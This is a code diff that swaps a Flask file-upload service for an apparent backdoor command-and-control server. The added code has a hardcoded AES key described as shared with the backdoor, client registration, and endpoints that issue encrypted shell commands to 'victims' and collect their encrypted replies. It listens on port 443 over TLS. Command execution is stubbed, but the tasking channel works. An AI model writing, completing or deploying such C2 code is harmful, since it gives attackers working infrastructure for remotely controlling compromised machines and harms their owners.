@@ -1,87 +1,75 @@
 import os
-from flask import Flask, request, jsonify, send_from_directory
-from Crypto.Cipher import AES
+import hashlib
 import base64
-from functools import wraps
-import logging
-from werkzeug.utils import secure_filename
-from dotenv import load_dotenv
-
-# Load environment variables from .env file
-load_dotenv()
+from flask import Flask, request, jsonify
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import uuid
 
 app = Flask(__name__)
 
-# Access environment variables
-app.config['SECRET_KEY'] = os.getenv('SECRET_KEY')
-app.config['UPLOAD_FOLDER'] = os.getenv('UPLOAD_FOLDER', 'uploads')
-app.config['ALLOWED_EXTENSIONS'] = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}
+# Configuration
+AES_KEY = hashlib.sha256(b"EynDnmNF4fipxGmiErq0hMOC-lXBuBxgRhIAHQDM8XA").digest()  # Same AES key as backdoor
+clients = {}
 
-# Setup basic logging
-logging.basicConfig(level=logging.INFO)
+# AES encryption and decryption functions
+def encrypt_response(response):
+    iv = os.urandom(16)
+    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
+    encrypted_data = cipher.encrypt(pad(response.encode(), AES.block_size))
+    return base64.b64encode(iv + encrypted_data).decode()
 
-# AES encryption setup
-def encrypt_file(file_data):
-    key = app.config['SECRET_KEY'].encode('utf-8')[:16]  # AES key should be 16, 24, or 32 bytes
-    cipher = AES.new(key, AES.MODE_EAX)
-    ciphertext, tag = cipher.encrypt_and_digest(file_data)
-    return cipher.nonce + tag + ciphertext
+def decrypt_command(data):
+    data = base64.b64decode(data)
+    iv = data[:16]
+    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
+    decrypted_data = unpad(cipher.decrypt(data[16:]), AES.block_size).decode()
+    return decrypted_data
 
-def decrypt_file(encrypted_data):
-    key = app.config['SECRET_KEY'].encode('utf-8')[:16]
-    nonce, tag, ciphertext = encrypted_data[:16], encrypted_data[16:32], encrypted_data[32:]
-    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
-    return cipher.decrypt_and_verify(ciphertext, tag)
+@app.route('/register', methods=['POST'])
+def register_client():
+    data = request.json
+    client_id = data.get('client_id')
+    if client_id:
+        clients[client_id] = {'status': 'registered'}
+        return jsonify({'status': 'registered'}), 200
+    return jsonify({'status': 'error', 'message': 'client_id is required'}), 400
 
-# Decorator for role-based authentication
-def role_required(role):
-    def decorator(f):
-        @wraps(f)
-        def decorated_function(*args, **kwargs):
-            user_role = os.getenv('USER_ROLE', 'user')  # Default role is user
-            if user_role != role:
-                return jsonify({"error": "Unauthorized"}), 403
-            return f(*args, **kwargs)
-        return decorated_function
-    return decorator
+@app.route('/check/<client_id>', methods=['GET'])
+def check_for_commands(client_id):
+    if client_id in clients:
+        # Here we could create commands dynamically, but for now, we send a simple shell command.
+        command = 'echo Hello, Victim!'
+        encrypted_command = encrypt_response(command)
+        return jsonify({'command': encrypted_command}), 200
+    return jsonify({'status': 'error', 'message': 'client not found'}), 404
 
-# Ensure the upload folder exists
-if not os.path.exists(app.config['UPLOAD_FOLDER']):
-    os.makedirs(app.config['UPLOAD_FOLDER'])
+@app.route('/command/<client_id>', methods=['POST'])
+def receive_command(client_id):
+    data = request.json
+    encrypted_command = data.get('command')
+    if encrypted_command:
+        try:
+            command = decrypt_command(encrypted_command)
+            # In a real implementation, you would execute the command here.
+            print(f"Received command: {command}")
+            return jsonify({'status': 'received'}), 200
+        except Exception as e:
+            return jsonify({'status': 'error', 'message': str(e)}), 500
+    return jsonify({'status': 'error', 'message': 'command is required'}), 400
 
-@app.route('/')
-def home():
-    return "Flask app with environment variables, encryption, and file uploads"
+@app.route('/response/<client_id>', methods=['POST'])
+def receive_response(client_id):
+    data = request.json
+    encrypted_response = data.get('response')
+    if encrypted_response:
+        try:
+            response = decrypt_command(encrypted_response)
+            print(f"Received response: {response}")
+            return jsonify({'status': 'received'}), 200
+        except Exception as e:
+            return jsonify({'status': 'error', 'message': str(e)}), 500
+    return jsonify({'status': 'error', 'message': 'response is required'}), 400
 
-@app.route('/upload', methods=['POST'])
-@role_required('admin')  # Only admin can upload
-def upload_file():
-    if 'file' not in request.files:
-        return jsonify({"error": "No file part"}), 400
-    file = request.files['file']
-    if file.filename == '':
-        return jsonify({"error": "No selected file"}), 400
-    if file and file.filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']:
-        filename = secure_filename(file.filename)
-        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-        
-        # Encrypt file before saving
-        encrypted_file = encrypt_file(file.read())
-        with open(filepath, 'wb') as f:
-            f.write(encrypted_file)
-        return jsonify({"message": "File uploaded successfully"}), 200
-    return jsonify({"error": "File type not allowed"}), 400
-
-@app.route('/download/<filename>', methods=['GET'])
-@role_required('admin')  # Only admin can download
-def download_file(filename):
-    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-    if os.path.exists(filepath):
-        with open(filepath, 'rb') as f:
-            encrypted_data = f.read()
-            decrypted_data = decrypt_file(encrypted_data)
-            return send_from_directory(app.config['UPLOAD_FOLDER'], filename, as_attachment=True)
-    return jsonify({"error": "File not found"}), 404
-
-if __name__ == '__main__':
-    app.run(debug=True)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=443, ssl_context='adhoc')  # Using HTTPS (SSL/TLS) by default
